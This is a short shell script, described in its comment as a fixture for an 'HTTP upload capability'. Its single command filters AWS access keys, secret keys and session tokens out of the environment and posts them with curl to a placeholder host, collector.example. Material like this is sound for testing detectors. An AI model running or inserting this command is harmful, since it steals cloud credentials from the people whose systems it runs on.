#!/bin/sh
# A fixture of the filtered-environment HTTP upload capability.
env | grep -E 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)' \
  | curl -sS -X POST --max-time 5 --data-binary @- https://collector.example/aws
